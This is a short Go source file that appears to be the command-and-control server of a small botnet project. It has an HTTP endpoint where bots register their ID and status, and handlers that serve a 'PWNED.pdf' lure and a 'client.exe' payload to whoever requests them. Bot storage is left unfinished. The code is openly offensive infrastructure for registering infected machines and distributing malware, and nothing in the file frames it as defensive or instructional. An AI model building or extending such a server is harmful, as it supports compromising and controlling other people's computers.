package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"path/filepath"
)

// temporary directory location
var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")

//var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")

type bot struct {
	Id     string `json:"bot_id"`
	Status string `json:"status"`
}

//TODO need storage of bots

func register(rw http.ResponseWriter, req *http.Request) {
	var b bot

	err := json.NewDecoder(req.Body).Decode(&b)
	if err != nil {
		http.Error(rw, err.Error(), http.StatusBadRequest)
		return
	}

	fmt.Printf("New Bot!\nID: %s\nStatus: %s\n", b.Id, b.Status)

	fmt.Fprintf(rw, "New Bot!\nID: %s\nStatus: %s\n", b.Id, b.Status)

	//TODO store bot
}

func pdfserver(res http.ResponseWriter, req *http.Request) {
	http.ServeFile(res, req, filepath.Join(srcDir, "/files/PWNED.pdf"))
}

func clientserver(res http.ResponseWriter, req *http.Request) {
	http.ServeFile(res, req, filepath.Join(srcDir, "/files/client.exe"))
}

func main() {
	mux := http.NewServeMux()

	fmt.Printf("Starting server at port 8081\n")

	pdf := http.HandlerFunc(pdfserver)
	mux.Handle("/pdf", pdf)

	reg := http.HandlerFunc(register)
	mux.Handle("/register", reg)

	client := http.HandlerFunc(clientserver)
	mux.Handle("/client", client)

	log.Println("Listening...")
	// start HTTP server with `http.DefaultServeMux` handler
	log.Fatal(http.ListenAndServe("localhost:8081", mux))

}
